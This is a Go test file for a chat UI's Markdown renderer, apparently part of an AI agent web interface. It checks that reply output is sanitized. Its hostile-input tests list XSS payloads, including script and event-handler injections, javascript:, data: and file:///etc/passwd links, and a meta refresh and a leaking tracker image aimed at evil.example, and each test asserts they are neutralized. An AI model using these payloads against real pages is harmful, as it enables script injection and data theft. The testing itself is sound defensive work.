package render_test

import (
	"errors"
	"flag"
	"io"
	"os"
	"slices"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/yuin/goldmark"
	"github.com/yuin/goldmark/parser"
	"golang.org/x/net/html"
	"golang.org/x/net/html/atom"

	"github.com/v8tix/inside-agent-web-ui/internal/core/chat"
	"github.com/v8tix/inside-agent-web-ui/internal/infrastructure/api/web/render"
)

// parse turns rendered HTML into a DOM, so tests assert on structure rather
// than on substrings: escaped text such as "&lt;script&gt;" is harmless and may
// well appear, a <script> element never may.
func parse(t *testing.T, fragment string) *html.Node {
	t.Helper()
	nodes, err := html.ParseFragment(strings.NewReader(fragment), &html.Node{
		Type: html.ElementNode, Data: "div", DataAtom: atom.Div,
	})
	require.NoError(t, err)
	root := &html.Node{Type: html.ElementNode, Data: "root"}
	for _, n := range nodes {
		root.AppendChild(n)
	}
	return root
}

func walk(n *html.Node, visit func(*html.Node)) {
	visit(n)
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		walk(c, visit)
	}
}

func elements(root *html.Node, tag string) []*html.Node {
	var out []*html.Node
	walk(root, func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == tag {
			out = append(out, n)
		}
	})
	return out
}

func attr(n *html.Node, key string) string {
	for _, a := range n.Attr {
		if a.Key == key {
			return a.Val
		}
	}
	return ""
}

func hasAttr(n *html.Node, key string) bool {
	return slices.ContainsFunc(n.Attr, func(a html.Attribute) bool { return a.Key == key })
}

func textOf(n *html.Node) string {
	var sb strings.Builder
	walk(n, func(c *html.Node) {
		if c.Type == html.TextNode {
			sb.WriteString(c.Data)
		}
	})
	return sb.String()
}

func renderMD(t *testing.T, src string) (string, *html.Node) {
	t.Helper()
	out := string(render.NewMarkdown().Render(src))
	return out, parse(t, out)
}

func TestMarkdown_Formatting(t *testing.T) {
	tests := []struct {
		name  string
		src   string
		check func(t *testing.T, root *html.Node)
	}{
		{"emphasis and inline code", "**bold**, *italic*, ~~gone~~ and `code`", func(t *testing.T, r *html.Node) {
			assert.Len(t, elements(r, "strong"), 1)
			assert.Len(t, elements(r, "em"), 1)
			assert.Len(t, elements(r, "del"), 1)
			assert.Equal(t, "code", textOf(elements(r, "code")[0]))
		}},
		{"headings are pushed down two levels so the page keeps one h1", "# One\n## Two\n### Three\n###### Six", func(t *testing.T, r *html.Node) {
			assert.Empty(t, elements(r, "h1"))
			assert.Empty(t, elements(r, "h2"))
			assert.Len(t, elements(r, "h3"), 1)
			assert.Len(t, elements(r, "h4"), 1)
			assert.Len(t, elements(r, "h5"), 1)
			assert.Len(t, elements(r, "h6"), 1, "levels beyond 6 stop at 6")
		}},
		{"lists", "- a\n- b\n\n3. c\n4. d", func(t *testing.T, r *html.Node) {
			assert.Len(t, elements(r, "ul"), 1)
			ol := elements(r, "ol")
			require.Len(t, ol, 1)
			assert.Equal(t, "3", attr(ol[0], "start"), "numbering that starts elsewhere is kept")
			assert.Len(t, elements(r, "li"), 4)
		}},
		{"a task list is a plain list", "- [ ] to do\n- [x] done", func(t *testing.T, r *html.Node) {
			assert.Empty(t, elements(r, "input"), "a checkbox is an input, and the page takes none from a reply")
			li := elements(r, "li")
			require.Len(t, li, 2)
			assert.Equal(t, "[ ] to do", textOf(li[0]))
			assert.Equal(t, "[x] done", textOf(li[1]), "the marks stay, so the reader sees what is done")
		}},
		{"a quote", "> wise words", func(t *testing.T, r *html.Node) {
			assert.Contains(t, textOf(elements(r, "blockquote")[0]), "wise words")
		}},
		{"a table with alignment", "| A | B |\n|:--|--:|\n| 1 | 2 |", func(t *testing.T, r *html.Node) {
			require.Len(t, elements(r, "table"), 1)
			assert.Len(t, elements(r, "thead"), 1)
			assert.Len(t, elements(r, "th"), 2)
			assert.Equal(t, "left", attr(elements(r, "th")[0], "align"))
			assert.Equal(t, "right", attr(elements(r, "th")[1], "align"))
		}},
		{"links open safely in a new tab", "[docs](https://example.com/a?b=1&c=2)", func(t *testing.T, r *html.Node) {
			a := elements(r, "a")
			require.Len(t, a, 1)
			assert.Equal(t, "https://example.com/a?b=1&c=2", attr(a[0], "href"))
			assert.Equal(t, "_blank", attr(a[0], "target"))
			for _, token := range []string{"noopener", "noreferrer", "nofollow"} {
				assert.Contains(t, attr(a[0], "rel"), token)
			}
		}},
		{"bare URLs become links", "see https://example.com/page now", func(t *testing.T, r *html.Node) {
			a := elements(r, "a")
			require.Len(t, a, 1)
			assert.Equal(t, "https://example.com/page", attr(a[0], "href"))
		}},
		{"mailto links are allowed", "[mail](mailto:a@example.com)", func(t *testing.T, r *html.Node) {
			a := elements(r, "a")
			require.Len(t, a, 1)
			assert.Equal(t, "mailto:a@example.com", attr(a[0], "href"))
			assert.ElementsMatch(t, []string{"nofollow", "noreferrer"}, strings.Fields(attr(a[0], "rel")))
			assert.False(t, hasAttr(a[0], "target"), "a link without a host opens no new tab")
		}},
		{"a link title does not reach the page", `[docs](https://example.com "the docs") and ![a chart](https://example.com/p.png "the chart")`, func(t *testing.T, r *html.Node) {
			a := elements(r, "a")
			require.Len(t, a, 2, "a link, and an image as a link")
			for _, link := range a {
				assert.False(t, hasAttr(link, "title"), "a link keeps its address and nothing else")
			}
		}},
		{"an image becomes a link that must be clicked", "![a chart](https://example.com/p.png)", func(t *testing.T, r *html.Node) {
			assert.Empty(t, elements(r, "img"))
			a := elements(r, "a")
			require.Len(t, a, 1)
			assert.Equal(t, "https://example.com/p.png", attr(a[0], "href"))
			assert.Equal(t, "a chart", textOf(a[0]))
		}},
		{"an image without alt text still gets a label", "![](https://example.com/p.png)", func(t *testing.T, r *html.Node) {
			assert.Equal(t, "image", textOf(elements(r, "a")[0]))
		}},
		{"unicode and entities survive", "café — 日本語 &amp; <3", func(t *testing.T, r *html.Node) {
			assert.Contains(t, textOf(r), "café — 日本語 &")
		}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			_, root := renderMD(t, tc.src)
			tc.check(t, root)
		})
	}
}

func TestMarkdown_CodeBlocks(t *testing.T) {
	t.Run("a known language is highlighted with classes and labelled", func(t *testing.T) {
		out, root := renderMD(t, "```go\nfmt.Println(\"hi\")\n```")

		block := elements(root, "div")
		require.Len(t, block, 1)
		assert.Equal(t, "code-block", attr(block[0], "class"))
		assert.Equal(t, "go", attr(block[0], "data-lang"))
		pre := elements(block[0], "pre")
		require.Len(t, pre, 1)
		assert.Contains(t, attr(pre[0], "class"), "chroma")
		assert.NotEmpty(t, elements(pre[0], "span"), "tokens are wrapped in spans")
		assert.Contains(t, textOf(pre[0]), `fmt.Println("hi")`)
		assert.NotContains(t, out, "style=", "classes, never inline styles: the CSP forbids them")
	})

	t.Run("an unknown or missing language is shown as plain, escaped code", func(t *testing.T) {
		for name, tc := range map[string]struct{ src, wantLabel string }{
			"unknown": {"```nosuchlang\nx < y && z\n```", "nosuchlang"}, // the declared name is still a useful label
			"none":    {"```\nx < y && z\n```", "text"},
		} {
			t.Run(name, func(t *testing.T) {
				_, root := renderMD(t, tc.src)

				block := elements(root, "div")
				require.Len(t, block, 1)
				assert.Equal(t, tc.wantLabel, attr(block[0], "data-lang"))
				code := elements(block[0], "code")
				require.Len(t, code, 1)
				assert.Equal(t, "x < y && z\n", textOf(code[0]))
			})
		}
	})

	t.Run("a language written with capitals keeps its label", func(t *testing.T) {
		for fence, wantLabel := range map[string]string{"Go": "go", "JSON": "json"} {
			t.Run(fence, func(t *testing.T) {
				_, root := renderMD(t, "```"+fence+"\n1\n```")

				block := elements(root, "div")
				require.Len(t, block, 1)
				assert.Equal(t, wantLabel, attr(block[0], "data-lang"), "the label is the name the highlighter knows it by")
				pre := elements(block[0], "pre")
				require.Len(t, pre, 1)
				assert.Contains(t, attr(pre[0], "class"), "chroma", "and the block is highlighted")
			})
		}
	})

	t.Run("a block made by indenting gets the same container", func(t *testing.T) {
		_, root := renderMD(t, "Run this:\n\n    x < y && z\n    done\n\nand wait.")

		block := elements(root, "div")
		require.Len(t, block, 1)
		assert.Equal(t, "code-block", attr(block[0], "class"))
		assert.Equal(t, "text", attr(block[0], "data-lang"))
		pre := elements(root, "pre")
		require.Len(t, pre, 1)
		assert.Same(t, block[0], pre[0].Parent, "the container is around the block")
		code := elements(pre[0], "code")
		require.Len(t, code, 1)
		assert.Equal(t, "x < y && z\ndone\n", textOf(code[0]))
	})

	t.Run("HTML inside a fence is shown, not run", func(t *testing.T) {
		_, root := renderMD(t, "```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n```")

		assert.Empty(t, elements(root, "script"))
		assert.Empty(t, elements(root, "img"))
		assert.Contains(t, textOf(root), "<script>alert(1)</script>")
	})

	// A block that names no language, fenced or made by indenting, is written by
	// the highlighter's plain path and not by the converter's own renderer for
	// code blocks: the container, then the lines as they are, escaped.
	t.Run("markup inside a block that names no language is shown, not run", func(t *testing.T) {
		lines := []string{
			"<script>alert(1)</script>",
			`<img src="x" onerror="alert(1)">`,
			`<a href="https://evil.example" onclick="alert(1)">a link</a>`,
			"[click](https://evil.example/a) or https://evil.example/b",
		}
		for name, src := range map[string]string{
			"fenced":   "```\n" + strings.Join(lines, "\n") + "\n```",
			"indented": "Run this:\n\n    " + strings.Join(lines, "\n    ") + "\n\nand wait.",
		} {
			t.Run(name, func(t *testing.T) {
				_, root := renderMD(t, src)

				for _, tag := range []string{"script", "img", "a"} {
					assert.Empty(t, elements(root, tag), "no <%s> reaches the page", tag)
				}
				walk(root, func(n *html.Node) {
					for _, a := range n.Attr {
						assert.False(t, strings.HasPrefix(strings.ToLower(a.Key), "on"), "event handler %s on <%s>", a.Key, n.Data)
					}
				})
				code := elements(root, "code")
				require.Len(t, code, 1)
				assert.Equal(t, strings.Join(lines, "\n")+"\n", textOf(code[0]), "the reader sees the characters as they were written")
			})
		}
	})

	t.Run("a language label with odd characters is neutralized", func(t *testing.T) {
		_, root := renderMD(t, "```go\"><script>x</script>\ncode\n```")

		assert.Empty(t, elements(root, "script"))
		for _, d := range elements(root, "div") {
			assert.Regexp(t, `^[a-z0-9+#._-]{1,30}$`, attr(d, "data-lang"))
		}
	})
}

func TestMarkdown_RawHTMLIsShownAsText(t *testing.T) {
	_, root := renderMD(t, "Use the <div> tag, like <b>this</b>.\n\n<details open>\n<summary>more</summary>\nhidden\n</details>")

	assert.Empty(t, elements(root, "div"))
	assert.Empty(t, elements(root, "b"))
	assert.Empty(t, elements(root, "details"))
	text := textOf(root)
	assert.Contains(t, text, "<div>", "text the model wrote about HTML is not swallowed")
	assert.Contains(t, text, "<b>this</b>")
	assert.Contains(t, text, "<summary>more</summary>")
}

func TestMarkdown_HostileInput(t *testing.T) {
	forbidden := []string{
		"script", "iframe", "style", "img", "svg", "math", "object", "embed", "form", "input",
		"button", "link", "meta", "base", "video", "audio", "source", "frame", "frameset", "template",
	}
	inputs := map[string]string{
		"script element":           "<script>alert(1)</script>",
		"script in a paragraph":    "hello <script>alert(1)</script> world",
		"image with onerror":       `<img src="x" onerror="alert(1)">`,
		"svg onload":               `<svg onload="alert(1)"><circle/></svg>`,
		"iframe":                   `<iframe src="https://evil.example"></iframe>`,
		"style block":              "<style>body{display:none}</style>",
		"anchor with handlers":     `<a href="javascript:alert(1)" onclick="alert(2)" onmouseover="alert(3)">x</a>`,
		"details ontoggle":         `<details open ontoggle="alert(1)"><summary>s</summary></details>`,
		"form":                     `<form action="https://evil.example"><input name="q"><button>Go</button></form>`,
		"object and embed":         `<object data="x.swf"></object><embed src="x.swf">`,
		"meta refresh":             `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
		"base href":                `<base href="https://evil.example/">`,
		"math":                     `<math><mtext><script>alert(1)</script></mtext></math>`,
		"javascript markdown link": "[click](javascript:alert(1))",
		"mixed case scheme":        "[click](JaVaScRiPt:alert(1))",
		"entity-obfuscated scheme": "[click](&#106;avascript:alert(1))",
		"tab inside scheme":        "[click](java\tscript:alert(1))",
		"data url link":            "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
		"vbscript link":            "[click](vbscript:msgbox(1))",
		"file link":                "[click](file:///etc/passwd)",
		"javascript autolink":      "<javascript:alert(1)>",
		"title attribute breakout": `[a](http://example.com "t\" onmouseover=\"alert(1)")`,
		"image with javascript":    "![x](javascript:alert(1))",
		"image tracker":            "![t](https://evil.example/pixel.png?leak=secret)",
		"link reference":           "[a][1]\n\n[1]: javascript:alert(1)",
		"nested emphasis break":    "**<script>alert(1)</script>**",
		"html comment":             "<!-- <script>alert(1)</script> -->",
		"cdata":                    "<![CDATA[<script>alert(1)</script>]]>",
		"null byte":                "<scr\x00ipt>alert(1)</scr\x00ipt>",
		// A link that is not absolute would be followed on our own origin, with the
		// reader's session: the model could make a link to /logout, say, and its
		// text could promise anything. Only the absolute ones are links.
		"link to a page of ours": "[sign out](/logout)",
		"protocol-relative link": "[x](//evil.example/x)",
		"fragment link":          "[c](#frag)",
		"relative path link":     "[e](relative/path)",
		"query-only link":        "[q](?x=1)",
		"dot-dot path link":      "[u](../../c/other)",
		"backslash path link":    `[b](\\evil.example\x)`,
	}
	for name, src := range inputs {
		t.Run(name, func(t *testing.T) {
			_, root := renderMD(t, src)

			walk(root, func(n *html.Node) {
				if n.Type != html.ElementNode {
					return
				}
				assert.NotContains(t, forbidden, n.Data, "forbidden <%s> in output", n.Data)
				for _, a := range n.Attr {
					assert.False(t, strings.HasPrefix(strings.ToLower(a.Key), "on"), "event handler %s on <%s>", a.Key, n.Data)
					assert.NotEqual(t, "style", a.Key, "inline style on <%s>", n.Data)
					assert.NotEqual(t, "srcdoc", a.Key)
				}
				if n.Data == "a" {
					href := strings.ToLower(attr(n, "href"))
					if href != "" {
						assert.Regexp(t, `^(https?://|mailto:)`, href, "unsafe link target")
					}
				}
			})
		})
	}
}

// What is not a link stays on the page as the words the model wrote.
func TestMarkdown_ALinkThatIsNotAbsoluteIsKeptAsText(t *testing.T) {
	_, root := renderMD(t, "Open [your settings](/settings) or [the docs](https://example.com/docs).")

	links := elements(root, "a")
	require.Len(t, links, 1, "only the absolute link is a link")
	assert.Equal(t, "https://example.com/docs", attr(links[0], "href"))
	assert.Contains(t, textOf(root), "your settings", "and the other one is still readable")
}

func TestMarkdown_UnfinishedInputWhileStreaming(t *testing.T) {
	prefixes := []string{
		"```go\nfunc main() {\n\tfmt.Println(",
		"**bold but not closed",
		"| a | b |\n|---|",
		"| lonely pipe",
		"[link text](http://exa",
		"[unclosed link",
		"1. one\n   - nested\n     - deeper\n       -",
		"> quote\n> > nested\n> > >",
		"<div class=\"x\"",
		"<scr",
		"`unterminated code",
		"~~strike",
		"![img",
		"***",
		"---\n===\n###",
		strings.Repeat("a", 100_000),
		strings.Repeat("- item\n", 5_000),
		strings.Repeat("> ", 500) + "deeply quoted",
	}
	for _, src := range prefixes {
		name := src
		if len(name) > 30 {
			name = name[:30]
		}
		t.Run(name, func(t *testing.T) {
			var out string
			require.NotPanics(t, func() { out = string(render.NewMarkdown().Render(src)) })
			assert.NotEmpty(t, out)
			assert.Empty(t, elements(parse(t, out), "script"))
		})
	}

	t.Run("an unclosed code fence still renders as code", func(t *testing.T) {
		_, root := renderMD(t, "text\n\n```python\nprint('half')")

		code := elements(root, "code")
		require.Len(t, code, 1)
		assert.Contains(t, textOf(code[0]), "print('half')")
	})

	t.Run("every prefix of a realistic reply renders", func(t *testing.T) {
		reply, err := os.ReadFile("testdata/reply.md")
		require.NoError(t, err)
		md := render.NewMarkdown()
		for i := range len(reply) {
			require.NotPanics(t, func() { _ = md.Render(string(reply[:i])) }, "prefix of %d bytes", i)
		}
	})
}

func TestMarkdown_VeryLargeInputIsShownAsPlainText(t *testing.T) {
	src := "# Title\n\n" + strings.Repeat("word ", 300_000) + "<script>alert(1)</script>"

	_, root := renderMD(t, src)

	assert.Empty(t, elements(root, "script"))
	assert.Empty(t, elements(root, "h3"), "past the size cap nothing is interpreted")
	assert.Len(t, elements(root, "pre"), 1)
}

// A reply is cut off at the size past which the page stops interpreting it. The
// two caps are one number in two packages that do not import each other. A reply
// that was cut off has passed it by its last event, so it is shown as plain text.
func TestMarkdown_TheSizeCapIsTheChatCap(t *testing.T) {
	assert.Equal(t, chat.DefaultMaxReplyBytes, render.MaxRenderBytes)
}

// failingConverter writes half a page and then fails.
type failingConverter struct{ goldmark.Markdown }

func (failingConverter) Convert(_ []byte, w io.Writer, _ ...parser.ParseOption) error {
	_, _ = io.WriteString(w, "<p>half a pa")
	return errors.New("the converter gave up")
}

// A reply that cannot be converted is still shown: as the text it is, escaped,
// and without what the converter had written before it failed.
func TestMarkdown_AFailedConversionIsShownAsPlainText(t *testing.T) {
	const src = "# Title\n\n<script>alert(1)</script> and **bold**"
	md := render.NewMarkdown()
	md.SetConverter(failingConverter{})

	root := parse(t, string(md.Render(src)))

	assert.Empty(t, elements(root, "script"))
	assert.Empty(t, elements(root, "p"), "the half page is not shown")
	pre := elements(root, "pre")
	require.Len(t, pre, 1)
	assert.Equal(t, "plain", attr(pre[0], "class"))
	assert.Equal(t, src, textOf(pre[0]), "the reply as it was written, not interpreted")
}

// update rewrites the golden file: go test ./internal/infrastructure/api/web/render -run TestMarkdown_Golden -update
var update = flag.Bool("update", false, "rewrite the golden file")

func TestMarkdown_Golden(t *testing.T) {
	src, err := os.ReadFile("testdata/reply.md")
	require.NoError(t, err)
	got := string(render.NewMarkdown().Render(string(src)))

	if *update {
		require.NoError(t, os.WriteFile("testdata/reply.golden.html", []byte(got), 0o644))
	}
	want, err := os.ReadFile("testdata/reply.golden.html")
	require.NoError(t, err, "create it with: go test ./internal/infrastructure/api/web/render -run TestMarkdown_Golden -update")
	assert.Equal(t, string(want), got, "rendering changed; if intended, run: go test ./internal/infrastructure/api/web/render -run TestMarkdown_Golden -update")
}

func BenchmarkMarkdown20KB(b *testing.B) {
	src := strings.Repeat("# Heading\n\nSome **bold** text with `code` and a [link](https://example.com).\n\n- one\n- two\n\n```go\nfmt.Println(1)\n```\n\n", 150)
	b.SetBytes(int64(len(src)))
	md := render.NewMarkdown()
	for b.Loop() {
		_ = md.Render(src)
	}
}

func TestChromaCSSIsUpToDate(t *testing.T) {
	want, err := os.ReadFile("../../../../../assets/static/css/chroma.css")
	require.NoError(t, err, "generate it with: go generate ./internal/infrastructure/api/web/render")

	assert.Equal(t, string(want), render.ChromaCSS(),
		"chroma.css is stale; run: go generate ./internal/infrastructure/api/web/render")
}
